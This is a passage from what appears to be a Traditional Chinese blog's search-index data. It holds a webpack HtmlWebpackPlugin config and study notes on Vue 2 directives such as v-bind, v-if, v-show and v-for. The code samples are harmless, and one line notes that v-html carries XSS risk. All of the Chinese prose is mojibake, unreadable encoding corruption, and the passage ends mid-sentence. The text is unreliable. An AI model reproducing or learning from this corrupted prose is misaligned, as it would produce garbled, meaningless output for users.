HtmlWebpackPlugin ä¾†èˆ‰ä¾‹ã€‚ ç°¡å–®ä¾†èªªï¼Œé€™å€‹ plug-in æ˜¯ç”¨ä¾†è‡ªå‹•ç”¢ç”Ÿ HTML æª”ã€‚ç”¨çš„æ–¹å¼å¾ˆç°¡å–®ï¼Œå®‰è£å¥½å¾Œè¨­å®š config å°±è¡Œäº†ï¼š 123456789101112131415161718// å¼•å…¥ plug-inconst HtmlWebpackPlugin = require('html-webpack-plugin')const path = require('path')module.exports = { entry: './src/main.js', mode: 'development', output: { path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' }, // è¨­å®š plug-in plugins: [ new HtmlWebpackPlugin({ template: 'src/index.html' }) ]} template å¯ä»¥æŒ‡å®šæ¨£æ¿ã€‚ç°¡å–®ä¾†èªªå°±æ˜¯å« webpack ç”¨ src åº•ä¸‹çš„ HTML ä¾†ç”¢ç”Ÿï¼Œé€™æ¨£å°±èƒ½å…ˆå¯«å¥½ HTML çš„å…§å®¹ã€‚ æœ€å¾Œåªè¦æ‰“åŒ…å°±æœƒè‡ªå‹•ç”¢ç”Ÿ index.htmlã€‚","link":"/2022/03/01/webpack-usage/"},{"title":"Vueçš„å­¸ç¿’ç´€éŒ„","text":"æœ€è¿‘æ­£åœ¨å­¸ç¿’ Vueï¼Œæƒ³çµ¦è‡ªå·±åšä¸€ä»½ç­†è¨˜ã€‚ é€™ç¯‡æ–‡ç« çš„ä¸»è¦åƒè€ƒè³‡æ–™ç‚º Vue çš„å®˜æ–¹æ•™ç¨‹ã€‚ Hello World1234567891011&lt;div id=\"app\"&gt; &lt;!-- â†“ é€™å€‹æ˜¯åŸå§‹çš„å¯«æ³• --&gt; &lt;p v-text=\"message\"&gt;&lt;/p&gt; &lt;!-- â†“ é€™å€‹æ˜¯ç¸®å¯«çš„å¯«æ³• --&gt; &lt;!-- â†“ å¾ Vueçš„ data ä¸­æ’ˆå‡º message çš„å€¼ --&gt; {{ message }}&lt;/div&gt;&lt;!-- â†“ Vue çš„ cdn --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"&gt;&lt;/script&gt; 123456789// â†“ å»ºç«‹ Vue çš„ç‰©ä»¶å¯¦é«”let app = new Vue({ // â†“ ç¶å®šåˆ°å“ªå€‹ HTML å…ƒç´ ä¸Š el: '#app', // â†“ è³‡æ–™å…§å®¹ data: { message: 'Hello Vue.' }}) Vue ä¸­çš„è³‡æ–™éƒ½æ˜¯å‹•æ…‹çš„ï¼Œå¦³è³‡æ–™ä¸€æ›´æ”¹ï¼Œé¡¯ç¤ºå‡ºçš„å…§å®¹ä¹ŸæœƒåŒæ­¥è·Ÿè‘—åšæ›´æ”¹ã€‚ å¦‚æœä½ å¸Œæœ›è³‡æ–™ä¸è¦è¢«å‹•æ…‹æ›´æ–°ï¼Œä½ å¯ä»¥ä½¿ç”¨v-onceé€™å€‹å±¬æ€§ã€‚ 1234&lt;div id=\"app\"&gt; &lt;!-- â†“ åŠ ä¸Š v-once --&gt; &lt;p v-once class=\"btn\"&gt;{{ msg }}&lt;/p&gt;&lt;/div&gt; åœ¨å…§å®¹ä¸­å¸¶å…¥ JS çš„è¡¨é”å¼é™¤äº†ç›´æ¥æŠŠ Vue çš„è³‡æ–™å¯«å…¥ä¹‹å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åœ¨{{ }}è£¡é¢æ·»åŠ è¡¨é”å¼ä¾†ç”¢ç”Ÿå‡ºä¸åŒçš„è³‡æ–™ã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ ç›´æ¥å¯«å…¥è³‡æ–™ --&gt; &lt;p&gt;åŸåƒ¹ï¼š${{ price }}&lt;/p&gt; &lt;!-- â†“ ç®—æ•¸é‹ç®—è¡¨é”å¼ --&gt; &lt;p&gt;æŠ˜æ‰£åƒ¹ï¼š${{ price * discount }}&lt;/p&gt;&lt;/div&gt; 1234567let vm = new Vue({ el: '#app', data: { price: 100, discount: 0.8 }}) 1234&lt;div id=\"app\"&gt; &lt;!-- â†“ ä¸‰å…ƒé‹ç®—å­ --&gt; &lt;p&gt;ä¸å¯åƒæ²¹ç‚¸ç‰©ï¼š{{ agree ? 'åŒæ„' : 'ä¸åŒæ„' }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { agree: true }}) 1234&lt;div id=\"app\"&gt; &lt;!-- â†“ æ·»åŠ è¡¨é”å¼ --&gt; &lt;p class=\"btn\"&gt;{{ msg.split('').reverse().join('') }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { msg: 'æŠŠé€™æ®µæ–‡å­—åéä¾†å¿µ' }}) å¯«å…¥ HTML å…§å®¹ä½¿ç”¨{{ }}ä¾†è¼¸å‡ºçš„å…§å®¹éƒ½æœƒä»¥ç´”æ–‡å­—ä¾†åšè¼¸å‡ºï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³å¯«å…¥ HTML çš„è©±ï¼Œå¿…é ˆæ”¹ä½¿ç”¨v-htmlã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ è¼¸å‡ºç´”æ–‡å­—å…§å®¹ --&gt; &lt;p&gt;{{ htmlData }}&lt;/p&gt; &lt;!-- â†“ è¼¸å‡º HTML å…§å®¹ --&gt; &lt;p v-html=\"htmlData\"&gt;&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { htmlData: '&lt;span class=\"txt--blue\"&gt;é€™æ®µæ–‡å­—æ‡‰è©²è¦æ˜¯è—è‰²çš„&lt;/span&gt;' }}) ğŸ’¡ è¨»ï¼šå¯«å…¥ HTML å…§å®¹å°±æ„å‘³è‘—æœ‰ XSS çš„é¢¨éšªï¼Œé€™ä¸€é»è¦å¤šç•™æ„ä¸€ä¸‹ã€‚ ç¶å®š HTML å±¬æ€§å€¼ v-bind:attr = æˆ‘è¦æŠŠå“ªä¸€å€‹å±¬æ€§ç¶å®šåˆ° Vueï¼Ÿ v-bind:attr=\"value\" = åƒè€ƒåˆ° Vue å¯¦é«”ä¸­çš„ value å€¼ã€‚ 12345&lt;div id=\"app\"&gt; &lt;!-- â†“ æŠŠ title å±¬æ€§ç¶å®šåˆ° Vue --&gt; &lt;!-- â†“ title çš„å±¬æ€§å€¼ç‚ºåœ¨ Vue ä¸­çš„ time çš„å€¼ --&gt; &lt;span v-bind:title=\"time\"&gt;ç§€å‡ºè®€å–è©²é é¢çš„æ™‚é–“é»&lt;/span&gt;&lt;/div&gt; 12345678let app = new Vue({ el: '#app', data: { // â†“ è³‡æ–™å…§å®¹ time: `${new Date().toLocaleString()} é é¢è¼‰å…¥å®Œæˆã€‚` }}) å¦‚æœä½ å»æ”¹timeçš„å€¼ï¼Œé‚£titleå±¬æ€§çš„å€¼ä¹Ÿæœƒè·Ÿè‘—åŒæ­¥æ›´æ–°ã€‚ åƒæ˜¯disabledé€™ç¨®å±¬æ€§ä¹Ÿèƒ½é€é v-bind ä¾†ç¶å®šï¼Œä¸¦ç”¨booleanä¾†æ§åˆ¶ã€‚ 123&lt;div id=\"app\"&gt; &lt;button class=\"btn\" v-bind:disabled=\"isButtonDisabled\"&gt;A button&lt;/button&gt;&lt;/div&gt; 1234567let vm = new Vue({ el: '#app', data: { // â†“ é€é Boolean ä¾†æ§åˆ¶æŒ‰éˆ•çš„å•Ÿç”¨èˆ‡é—œé–‰ isButtonDisabled: true }}) å‹•æ…‹åƒæ•¸æˆ‘å€‘å‰é¢ç”¨çš„v-bind:href, v-bind:disabledç­‰ï¼Œé€™äº›æ”¾åœ¨:(å†’è™Ÿ)å¾Œé¢çš„å€¼éƒ½æˆ‘å€‘ç¨±ç‚ºåƒæ•¸ã€‚ å¦‚æœç¾åœ¨æƒ³ä½¿ç”¨è®Šæ•¸ä¾†è¡¨ç¤ºé€™äº›åƒæ•¸ï¼Œå¯ä»¥ä½¿ç”¨[ ]ä¾†å¯¦ç¾ã€‚ ğŸ’¡ è¨» 1ï¼šå‹•æ…‹åƒæ•¸è½èµ·ä¾†æœ‰é»ç¹å£ï¼Œä½†æ˜¯å…¶å¯¦æ˜¯å› ç‚ºæˆ‘å€‘åœ¨ Vue ä¸­å®šç¾©çš„è®Šæ•¸éƒ½æœƒå‹•æ…‹æ›´æ–°ï¼Œæ‰€ä»¥æ‰æœƒç”¨å‹•æ…‹é€™å€‹è©ä¾†è§£é‡‹å§ã€‚ğŸ’¡ è¨» 2ï¼š[ ]åªæ¥å—å­—ä¸²å€¼ 1234567&lt;div id=\"app\"&gt; &lt;!-- â†“ åŸæœ¬çš„å¯«æ³• --&gt; &lt;a v-bind:href=\"url\"&gt;link-1&lt;/a&gt; &lt;!-- â†“ æ”¹ç”¨è®Šæ•¸ä¾†ä»£æ›¿ --&gt; &lt;a v-bind:[attribute]=\"url\"&gt;link-2&lt;/a&gt;&lt;/div&gt; 12345678let vm = new Vue({ el: '#app', data: { // â†“ ç”¨ä¾†ç•¶ä½œåƒæ•¸ attribute: 'href', url: 'https://www.google.com/' }}) äº‹ä»¶ç¶å®šä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ åŸå§‹å¯«æ³• --&gt; &lt;button class=\"btn\" v-on:click=\"count++\"&gt;{{ count }}&lt;/button&gt; &lt;!-- â†“ æ”¹ç”¨è®Šæ•¸ä¾†ä»£æ›¿ --&gt; &lt;button class=\"btn\" v-on:[eventname]=\"count++\"&gt;{{ count }}&lt;/button&gt;&lt;/div&gt; 12345678let vm = new Vue({ el: '#app', data: { count: 0, // â†“ ç”¨ä¾†ç•¶ä½œåƒæ•¸ eventname: 'click' }}) ğŸ’¡ è¨» 1ï¼šé€™è£¡ä¸è¦ç”¨é§å³°å¼ä¾†å‘½åï¼Œå› ç‚ºæ­¤è™•çš„ HTML ç„¡æ³•é€éKebab-case (é€£å­—ç¬¦è™Ÿ)ä¾†è®€å–ï¼Œè€Œæ˜¯æœƒç›´æ¥è½‰æˆå°å¯«ã€‚ğŸ’¡ è¨» 2ï¼šå¦‚æœæƒ³è¦è§£é™¤ç¶å®šï¼Œå¯ä»¥å°‡åƒæ•¸å€¼è¨­ç‚ºnull å¯«æˆè®Šæ•¸çš„å¥½è™•æ˜¯ï¼Œå¯ä»¥å¸¶å…¥è¡¨é”å¼ã€‚ 12&lt;!-- â†“ å¸¶å…¥è¡¨é”å¼ --&gt;&lt;p v-bind:[foo+\"le\"]=\"value\"&gt;æŠŠæ¸¸æ¨™æ”¾ä¸Šä¾†&lt;/p&gt; 123456789let vm = new Vue({ el: '#app', data: { count: 0, // â†“ ç”¨ä¾†ç•¶ä½œåƒæ•¸ foo: 'tit', value: 'çœŸè½è©±' }}) ğŸ’¡ è¨» ï¼šé€™è£¡åªæ˜¯æ–¹ä¾¿ç¤ºç¯„æ‰é€™æ¨£å¯«ï¼Œå¯¦éš›ä½¿ç”¨è¡¨é”å¼æ™‚ï¼Œè«‹ç›¡é‡é¿å…å‡ºç¾ç©ºæ ¼, å¼•è™Ÿç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦å‰‡å¯èƒ½æœƒå ±éŒ¯ã€‚ ä¿®é£¾å­v-æŒ‡ä»¤å¾Œé¢é™¤äº†æ¥:åƒæ•¸ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥æ¥.ä¿®é£¾å­ã€‚ 123456789&lt;div id=\"app\"&gt; &lt;!-- â†“ ä½¿ç”¨ä¿®é£¾å­ä¾†çµ‚æ­¢å…ƒç´ çš„é è¨­è¡Œç‚º --&gt; &lt;form v-on:submit.prevent=\"onSubmit\"&gt; &lt;!-- â†“ é€å‡ºéˆ• --&gt; &lt;input type=\"submit\" value=\"Send\" /&gt; &lt;!-- â†“ ç•¶æŒ‰ä¸‹é€å‡ºéˆ•æ™‚æ‰æœƒé¡¯ç¤ºçš„æ–‡å­— --&gt; &lt;p v-if=\"isSended\"&gt;å·²æŒ‰ä¸‹é€å‡ºéˆ•ã€‚&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; 123456789101112let vm = new Vue({ el: '#app', data: { isSended: false }, methods: { onSubmit: function () { // â†“ æ”¹è®Š isSended çš„å€¼ this.isSended = true } }}) æ³¨æ„åˆ°è¡¨å–®ä¸¦æ²’æœ‰è¢«é€å‡ºï¼ˆæ²’æœ‰é‡æ–°æ¸²æŸ“çš„å‹•ä½œï¼‰ï¼Œé€™å°±æ˜¯ä¿®é£¾å­.preventå¸¶ä¾†çš„ä½œç”¨ã€‚ v-if å…ƒç´ çš„é¡¯ç¤ºèˆ‡éš±è—é€év-ifå¯ä»¥æ±ºå®šä¸€å€‹å…ƒç´ è¦é¡¯ç¤º or éš±è—ã€‚ å¦‚æœæ˜¯truthyï¼Œå…ƒç´ æœƒé¡¯ç¤ºå‡ºä¾†ã€‚ å¦‚æœæ˜¯falsyï¼Œå…ƒç´ æœƒéš±è—èµ·ä¾†ã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ åˆ¤æ–· Vue ä¸­ exist çš„å€¼ --&gt; &lt;p v-if=\"exist\"&gt;å¦³çœ‹çš„åˆ°æˆ‘&lt;/p&gt; &lt;!-- â†“ åˆ¤æ–· Vue ä¸­ notExist çš„å€¼ --&gt; &lt;p v-if=\"notExist\"&gt;å¦³çœ‹ä¸åˆ°æˆ‘&lt;/p&gt;&lt;/div&gt; 12345678910let app = new Vue({ el: '#app', data: { // â†“ å…ƒç´ æœƒé¡¯ç¤º exist: true, // â†“ å…ƒç´ æœƒéš±è— notExist: false }}) ä¹Ÿå¯ä»¥æ·»åŠ ä¸€å€‹v-elseã€‚ 123456&lt;div id=\"app\"&gt; &lt;!-- â†“ åˆ¤æ–· Vue ä¸­ exist çš„å€¼ --&gt; &lt;p v-if=\"exist\"&gt;ä»Šå¤©æœ‰æ™šé¤åƒ&lt;/p&gt; &lt;!-- â†“ è‹¥ v-if ä¸æˆç«‹ï¼Œé¡¯ç¤ºé€™å€‹å…ƒç´  --&gt; &lt;p v-else&gt;ä»Šå¤©æ²’æ™šé¤åƒ&lt;/p&gt;&lt;/div&gt; ğŸ’¡ è¨»ï¼šv-else å¿…é ˆç·Šè·Ÿåœ¨ v-if æˆ– v-else-if çš„å…ƒç´ å¾Œé¢ï¼Œå¦å‰‡ç„¡æ³•è¢«è­˜åˆ¥ã€‚ æˆ–è€…æ˜¯v-else-if 123456789&lt;h1&gt;Hello&lt;/h1&gt;&lt;!-- â†“ countSister ç‚º 1--&gt;&lt;p v-if=\"countSister === 1\"&gt;You have a sister.&lt;/p&gt;&lt;!-- â†“ countSister ç‚º 2--&gt;&lt;p v-else-if=\"countSister === 2\"&gt;You have two sisters.&lt;/p&gt;&lt;!-- â†“ countSister ç‚º 3--&gt;&lt;p v-else-if=\"countSister === 3\"&gt;You have three sisters.&lt;/p&gt;&lt;!-- â†“ countSister ä¸ç‚º 1,2,3 --&gt;&lt;p v-else&gt;Wake up, you have too more sister or you don't even have a sister.&lt;/p&gt; ğŸ’¡ è¨»ï¼šv-else-if ä¸€æ¨£è¦è·Ÿåœ¨ v-if æˆ– v-else-if çš„å…ƒç´ å¾Œé¢ï¼Œå¦å‰‡ç„¡æ³•è¢«è­˜åˆ¥ã€‚ æ‰€ä»¥é™¤äº†å‰é¢çš„æ–‡å­—ã€å±¬æ€§ä¹‹å¤–ï¼ŒVue é‚„èƒ½å¤ æ§åˆ¶ DOM çš„çµè³¼ æ§åˆ¶å¤šå€‹å…ƒç´ å¦‚æœä¸€æ¬¡æƒ³æ§åˆ¶å¤šå€‹å…ƒç´ çš„é¡¯ç¤ºèˆ‡å¦ï¼Œå¯ä»¥ä½¿ç”¨&lt;template&gt;å…ƒç´ å°‡å…ƒç´ çµ¦ç¾¤çµ„èµ·ä¾†ã€‚ 12345&lt;template v-if=\"noSister\"&gt; &lt;h1&gt;Hello&lt;/h1&gt; &lt;p&gt;Wake up, you don't have a sister.&lt;/p&gt; &lt;p&gt;You only have a brother.&lt;/p&gt;&lt;/template&gt; é€™æ¨£å­æœ€å¾Œçš„çµæœä¸æœƒæ¸²æŸ“å‡º&lt;template&gt;ï¼Œåªæœƒæœ‰è£¡é¢çš„å…§å®¹ã€‚ ç¯€èƒ½æ©Ÿåˆ¶èˆ‡ key å±¬æ€§ç‚ºäº†çœæ‰ä¸å¿…è¦çš„æµªè²»ï¼Œè‹¥æ²’æœ‰å¿…è¦çš„è©±ï¼ŒVue æœƒç›¡é‡ç”¨ç›®å‰å­˜åœ¨çš„å…ƒç´ ä¾†åšä¿®æ”¹å…§å®¹ï¼Œè€Œä¸æ˜¯æŠŠæ•´å€‹å…ƒç´ é‡æ–°æ¸²æŸ“ä¸€æ¬¡ã€‚ 1234567891011&lt;!-- â†“ loginType ç‚º username --&gt;&lt;template v-if=\"loginType === 'username' \"&gt; &lt;label for=\"username\"&gt;Username:&lt;/label&gt; &lt;input id=\"username\" type=\"text\" placeholder=\"è¼¸å…¥ä½¿ç”¨è€…åç¨±\" /&gt;&lt;/template&gt;&lt;!-- â†“ loginType ä¸ç‚º username --&gt;&lt;template v-else&gt; &lt;label for=\"email\"&gt;Username:&lt;/label&gt; &lt;input id=\"email\" type=\"email\" placeholder=\"è¼¸å…¥ä¿¡ç®±\" /&gt;&lt;/template&gt; ç•¶æˆ‘å€‘åˆ‡æ›çš„æ™‚ï¼Œä½ èƒ½çœ‹åˆ°å…ƒç´ æ²’æœ‰é‡æ–°æ¸²æŸ“ï¼Œåªæœ‰å±¬æ€§è·Ÿå…§å®¹çš„éƒ¨åˆ†è¢«ä¿®æ”¹ï¼Œä¸¦ä¸”æˆ‘å€‘è¼¸å…¥çš„å€¼ä¹Ÿç¹¼çºŒåœç•™åœ¨è¼¸å…¥æ ¼ä¸­ã€‚ å¦‚æœä¸æƒ³å¥—ç”¨é€™ç¨®æ©Ÿåˆ¶ï¼Œå¯ä»¥åœ¨å…ƒç´ ä¸­åŠ å…¥keyå±¬æ€§ä¾†è®“å…ƒç´ å…·æœ‰å”¯ä¸€æ€§ã€‚ 12345678910111213141516&lt;!-- â†“ loginType ç‚º username --&gt;&lt;template v-if=\"loginType === 'username' \"&gt; &lt;label for=\"username\"&gt;Username:&lt;/label&gt; &lt;input id=\"username\" type=\"text\" placeholder=\"è¼¸å…¥ä½¿ç”¨è€…åç¨±\" key=\"typeOfUsername\" /&gt;&lt;/template&gt;&lt;!-- â†“ loginType ä¸ç‚º username --&gt;&lt;template v-else&gt; &lt;label for=\"email\"&gt;Username:&lt;/label&gt; &lt;input id=\"email\" type=\"email\" placeholder=\"è¼¸å…¥ä¿¡ç®±\" key=\"typeOfEmail\" /&gt;&lt;/template&gt; ç¾åœ¨å…©å€‹&lt;input&gt;å„è‡ªå…·æœ‰å”¯ä¸€æ€§ï¼Œæ‰€ä»¥åˆ‡æ›æ™‚æœƒé‡æ–°æ¸²æŸ“ï¼Œè‡³æ–¼&lt;label&gt;é‚„æ˜¯ç¹¼çºŒä½¿ç”¨ç¯€èƒ½æ©Ÿåˆ¶ï¼Œåªæœ‰å…§å®¹è¢«ä¿®æ”¹ã€‚ v-showä¸€å€‹è·Ÿv-ifå¾ˆé¡ä¼¼çš„æŒ‡ä»¤ï¼Œç”¨æ³•ä¸Šå¤§è‡´ç›¸åŒ 1&lt;p v-show=\"ok\"&gt;åªæ˜¯æ®µæ–‡å­—&lt;/p&gt; ğŸ’¡ è¨»ï¼šv-show ä¸æ”¯æ´ &lt;template&gt; èˆ‡ v-else ã€‚ ä¸éå®ƒè·Ÿv-ifæœ‰å€‹å¾ˆå¤§çš„å·®ç•°åœ¨æ–¼ï¼šæ˜¯å¦æœƒæ¸²æŸ“åˆ°DOMä¸­ï¼Ÿ v-showçš„å…ƒç´ æ˜¯åˆ©ç”¨ CSS ä¸­çš„displayä¾†æ§åˆ¶å…ƒç´ æ˜¯å¦è¦é¡¯ç¤ºï¼Œæ‰€ä»¥ä¸è«–é¡¯ç¤ºèˆ‡å¦ï¼Œé€™å€‹å…ƒç´ åœ¨ä¸€é–‹å§‹éƒ½æœƒè¢«æ¸²æŸ“åˆ° DOM ä¸­ã€‚ v-ifæœƒæ ¹æ“šæ¢ä»¶ä¾†åˆ¤æ–·æ˜¯å¦è¦æŠŠå…ƒç´ æ¸²æŸ“åˆ° DOM ä¸­ï¼Œæ‰€ä»¥å¦‚æœæ¢ä»¶ä¸æˆç«‹ï¼Œå…ƒç´ å°±çœŸçš„ä¸æœƒè¢«æ¸²æŸ“åˆ° DOM ä¸­ã€‚ æ‰€ä»¥å¦‚æœæŸå€‹å…ƒç´ ç¶“å¸¸åœ¨é¡¯ç¤ºèˆ‡éš±è—é–“åšåˆ‡æ›ï¼Œv-ifæœƒæ¯”è¼ƒé©åˆã€‚ åä¹‹ï¼Œå¦‚æœæŸå€‹å…ƒç´ ä¸å¸¸åœ¨é¡¯ç¤ºèˆ‡éš±è—é–“åšåˆ‡æ›ï¼Œv-showæœƒæ¯”è¼ƒé©åˆã€‚ v-for é‡è¤‡ç”¢ç”Ÿå…ƒç´ é€év-forå¯ä»¥ä¾†æ ¹æ“šè³‡æ–™çš„æ•¸é‡ï¼ˆlengthï¼‰ï¼Œä¾†ç”¢ç”Ÿå‡ºå°æ‡‰æ•¸é‡çš„å…ƒç´ ã€‚ ğŸ’¡ è¨» 1ï¼šv-forå¯«åœ¨å“ªå€‹å…ƒç´ èº«ä¸Šï¼Œå“ªå€‹å…ƒç´ å°±æœƒé‡è¤‡ç”¢ç”Ÿ ã€‚ğŸ’¡ è¨» 2ï¼šitem in list ä¹Ÿå¯ä»¥å¯«æˆ item of listã€‚ è¿­ä»£çš„è³‡æ–™ç‚ºé™£åˆ—123456&lt;ul class=\"menu\"&gt; &lt;!-- â†“ è¿­ä»£ dinnerList é€™å€‹é™£åˆ— --&gt; &lt;!-- â†“ item æ˜¯è‡ªè¨‚çš„è®Šæ•¸åç¨± --&gt; &lt;!-- â†“ ç”¨ä¾†ä»£è¡¨é™£åˆ—ä¸­æ¯ä¸€å€‹é …ç›®çš„å€¼ --&gt; &lt;li class=\"btn\" v-for=\"item of dinnerList\"&gt;{{ item }}&lt;/li&gt;&lt;/ul&gt; 123456let vm = new Vue({ el: '#app', data: { dinnerList: ['è±¬æ’é£¯', 'å’–å“©é£¯', 'ç‚’é£¯', 'éºµåŒ…', 'æ‹‰éºµ'] }}) ä½ ä¹Ÿå¯ä»¥æŠŠé€™æ®µéç¨‹æƒ³åƒæˆæ˜¯é€™æ¨£å­ï¼š 123for (let i = 0; i &lt; foods.length; i++) { li.textContent = foods[i]} è¿­ä»£çš„é™£åˆ—ç‚ºç‰©ä»¶12345&lt;ul class=\"menu\"&gt; &lt;!-- â†“ èˆ‡å‰›å‰›ä¸€æ¨£ï¼Œåªæ˜¯ç¾åœ¨è³‡æ–™è®Šæˆæ˜¯ç‰©ä»¶ --&gt; &lt;!-- â†“ info ä»£è¡¨ç‰©ä»¶ä¸­æ¯å€‹å±¬æ€§çš„å€¼ --&gt; &lt;li class=\"btn\" v-for=\"info in character\"&gt;{{ info }}&lt;/li&gt;&lt;/ul&gt; 12345678910111213let vm = new Vue({ el: '#app', data: { // â†“ ç‰©ä»¶æ ¼å¼çš„è³‡æ–™ character: { name: 'ç…‰ç„æå£½éƒ', level: 'ç‚æŸ±', sex: 'ç”·', age: '20æ­²', death: 'è¢«çŒ—çª©åº§æ‰“æ­»' } }}) ç¬¬äºŒå€‹å¯é¸åƒæ•¸å¦‚æœæƒ³è¦å–å¾—è¿­ä»£å…ƒç´ çš„ç´¢å¼•å€¼ï¼Œå¯ä»¥åŠ å…¥ç¬¬äºŒå€‹å¯é¸åƒæ•¸ã€‚ 12345678&lt;ul class=\"menu\"&gt; &lt;!-- â†“ è¿­ä»£ dinnerList é€™ç­†è³‡æ–™ --&gt; &lt;!-- â†“ item ç‚ºè³‡æ–™é™£åˆ—ä¸­çš„ æ¯å€‹é …ç›® --&gt; &lt;!-- â†“ index ç‚ºè¿­ä»£é …ç›®ä¸­çš„ ç´¢å¼•å€¼ --&gt; &lt;li class=\"btn\" v-for=\"(item, index) in dinnerList\"&gt; {{ index }} {{ item }} &lt;/li&gt;&lt;/ul&gt; 123456let vm = new Vue({ el: '#app', data: { dinnerList: ['è±¬æ’é£¯', 'å’–å“©é£¯', 'ç‚’é£¯', 'éºµåŒ…', 'æ‹‰éºµ'] }}) å¦‚æœè¿­ä»£çš„è³‡æ–™æ˜¯ç‰©ä»¶çš„è©±ï¼Œç¬¬äºŒå€‹åƒæ•¸å¯ä»¥ç”¨ä¾†è¡¨ç¤ºç‰©ä»¶ä¸­çš„éµå(key) 12345&lt;ul class=\"menu\"&gt; &lt;!-- â†“ value ç‚º éµå€¼ --&gt; &lt;!-- â†“ key ç‚º éµå--&gt; &lt;li class=\"btn\" v-for=\"(value, key) in character\"&gt;{{ key }}ï¼š{{ value }}&lt;/li&gt;&lt;/ul&gt; å¦‚æœæƒ³åœ¨ç‰©ä»¶ä¸­å–å¾—ç´¢å¼•å€¼ï¼Œå¯ä»¥åŠ å…¥ç¬¬ä¸‰å€‹åƒæ•¸ä¾†å–å¾—ã€‚ 12345678&lt;ul class=\"menu\"&gt; &lt;!-- â†“ value ç‚º éµå€¼ --&gt; &lt;!-- â†“ key ç‚º éµå--&gt; &lt;!-- â†“ index ç‚º ç´¢å¼•å€¼--&gt; &lt;li class=\"btn\" v-for=\"(value, key, index) in character\"&gt; ({{index}}) {{ key }}ï¼š{{ value }} &lt;/li&gt;&lt;/ul&gt; æŒ‡å®šç‰¹å®šæ•¸å€¼é™¤äº†è¿­ä»£ä¸€å€‹é™£åˆ—æˆ–ç‰©ä»¶ä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šä¸€å€‹æ•¸å­—ä¾†é‡è¤‡ç”¢ç”Ÿå…ƒç´ ã€‚ 1234&lt;ul class=\"list\"&gt; &lt;!-- â†“ ç”¢ç”Ÿ 12 å€‹å…ƒç´  --&gt; &lt;li class=\"btn\" v-for=\"i in 12\"&gt;{{ i }}&lt;/li&gt;&lt;/ul&gt; ğŸš€ Codepenï¼šé»é€™è£¡ é‡è¤‡ç”¢ç”Ÿå¤šå€‹å…ƒç´ èˆ‡ v-if çš„æ¦‚å¿µä¸€æ¨£ï¼Œå¦‚æœè¦ç”¢ç”Ÿçš„æ˜¯ä¸€çµ„å…ƒç´ ï¼Œå¯ä»¥ç”¨ &lt;template&gt; ä¾†æŠŠå®ƒå€‘çµ¦åŒ…èµ·ä¾†ã€‚ 12345678&lt;!-- ç”¢ç”Ÿ 5 çµ„ä¸‹é¢çš„å…ƒç´ å€‘ --&gt;&lt;template v-for=\"i in 5\"&gt; &lt;h2 class=\"title\"&gt;ç”¢ç”Ÿ1 ~ 12&lt;/h2&gt; &lt;ul class=\"list\"&gt; &lt;!-- ç”¢ç”Ÿ 12 å€‹å…ƒç´  --&gt; &lt;li class=\"btn\" v-for=\"i in 12\"&gt;{{ i }}&lt;/li&gt; &lt;/ul&gt;&lt;/template&gt; ğŸš€ Codepenï¼šé»é€™è£¡ ç¯€èƒ½æ©Ÿåˆ¶èˆ‡ key å±¬æ€§å‰é¢æåˆ°çš„ç¯€èƒ½æ©Ÿåˆ¶ï¼Œåœ¨v-forä¸­ä¹Ÿæœƒå¥—ç”¨ã€‚ å¦‚æœv-forè¿­ä»£çš„è³‡æ–™ç™¼ç”Ÿäº†æ›´æ–°ï¼Œç‚ºäº†ç¯€çœè³‡æºï¼ŒVue ä¸€æ¨£æœƒç›¡å¯èƒ½ä½¿ç”¨ç¾æœ‰çš„å…ƒç´ ä¾†åšä¿®æ”¹ï¼Œè€Œä¸æ˜¯æŠŠæ•´å€‹è³‡æ–™çµ¦é‡æ–°æ¸²æŸ“ä¸€æ¬¡ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ ğŸ’¡ è¨» ï¼šä»”ç´°çœ‹ï¼Œåªæœ‰å…§å®¹çš„éƒ¨åˆ†è¢«æ›´æ–°ï¼Œä½†å…ƒç´ ä¸¦æ²’æœ‰è¢«é‡æ–°æ¸²æŸ“ã€‚ å¦‚æœä¸€å€‹åˆ—è¡¨åªæ˜¯å–®ç´”ç”¨ä¾†é¡¯ç¤ºå…§å®¹ï¼Œé‚£é€™ç¨®ç¯€èƒ½æ©Ÿåˆ¶ç¢ºå¯¦æ˜¯æ²’ä»€éº¼å•é¡Œçš„ã€‚ ä½†å¦‚æœæ˜¯åƒä¸Šé¢çš„æƒ…æ³ï¼Œé€™å€‹åˆ—è¡¨æœƒèˆ‡ä½¿ç”¨è€…äº’å‹•ï¼Œé‚£å°±æœƒè®“äººæ„Ÿåˆ°æœ‰é»å›°æƒ‘ã€‚ è¦è§£æ±ºç¯€èƒ½æ©Ÿåˆ¶çš„å‰¯ä½œç”¨ï¼Œä¸€æ¨£æ˜¯åŠ ä¸Škeyé€™å€‹å±¬æ€§ä¾†è®“å…ƒç´ å…·æœ‰å”¯ä¸€æ€§ï¼Œç¢ºä¿å®ƒèƒ½å¤ è¢«é‡æ–°æ¸²æŸ“ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ ğŸ’¡ è¨» ï¼šç¾åœ¨ç•¶è³‡æ–™æ›´æ–°æ™‚ï¼Œæ•´å€‹&lt;div&gt;éƒ½æœƒè¢«é‡æ–°æ¸²æŸ“ï¼Œè€Œä½ç½®æ˜¯æ­£ç¢ºçš„ã€‚ é™£åˆ—çš„æ›´æ–°ç”±æ–¼ Vue æœƒéš¨è‘—è³‡æ–™çš„æ›´æ–°ä¾†æ›´æ–°ç•«é¢ï¼Œæ‰€ä»¥å¦‚æœä½ 